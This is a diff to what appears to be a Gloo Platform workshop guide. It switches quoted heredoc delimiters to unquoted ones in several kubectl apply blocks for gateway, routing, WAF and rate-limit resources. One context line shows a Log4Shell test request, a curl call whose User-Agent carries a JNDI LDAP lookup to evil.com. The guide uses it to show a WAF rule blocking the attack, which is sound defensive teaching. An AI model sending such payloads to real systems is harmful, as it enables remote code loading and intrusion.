@@ -175,7 +175,7 @@ Imagine that you have the following teams. Each team represents a "tenant" in Gl
 Also note that a dedicated namespace is created for each workspace to place their configuration (`ops-team`, `dev-team` namespaces). It is recommended that the configuration is separate from your deployments.
 
 ```yaml
-kubectl apply -f - <<'EOF'
+kubectl apply -f - <<EOF
 apiVersion: admin.gloo.solo.io/v2
 kind: Workspace
 metadata:
@@ -218,7 +218,7 @@ Each workspace can have only one WorkspaceSettings resource.
 
 1. Create ingress routes from the gateway and delegate the traffic to the `dev-team`.
 ```yaml
-kubectl apply -f - <<'EOF'
+kubectl apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: VirtualGateway
 metadata:
@@ -264,7 +264,7 @@ EOF
 2. Create a route table to send traffic to the frontend application.
 
 ```yaml
-kubectl apply -f - <<'EOF'
+kubectl apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: RouteTable
 metadata:
@@ -301,7 +301,7 @@ printf "\n\nGloo Gateway available at http://$GLOO_GATEWAY\n"
 * Exposing a single service 
 
 ```yaml
-kubectl apply -f - <<'EOF'
+kubectl apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: RouteTable
 metadata:
@@ -357,7 +357,7 @@ grpcurl --plaintext --proto ./install/online-boutique/online-boutique.proto -d '
 * External endpoint
 
 ```yaml
-kubectl apply -f - <<'EOF'
+kubectl apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: ExternalEndpoint
 metadata:
@@ -444,7 +444,7 @@ curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY
   * In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
 
 ```yaml
-kubectl apply -f - <<'EOF'
+kubectl apply -f - <<EOF
 apiVersion: security.policy.gloo.solo.io/v2
 kind: WAFPolicy
 metadata:
@@ -681,7 +681,7 @@ rm tls.crt tls.key
 
 2. Adding HTTPS to our gateway is simple as updating the virtual gateway to use our ssl certificate
 ```yaml
-kubectl apply -f - <<'EOF'
+kubectl apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: VirtualGateway
 metadata:
@@ -760,7 +760,7 @@ The `RateLimitPolicy` pulls together the `RateLimitClientConfig`, `RateLimitServ
 * Apply the `RateLimitPolicy`
 
 ```yaml
-kubectl apply -f - <<'EOF'
+kubectl apply -f - <<EOF
 apiVersion: trafficcontrol.policy.gloo.solo.io/v2
 kind: RateLimitClientConfig
 metadata:
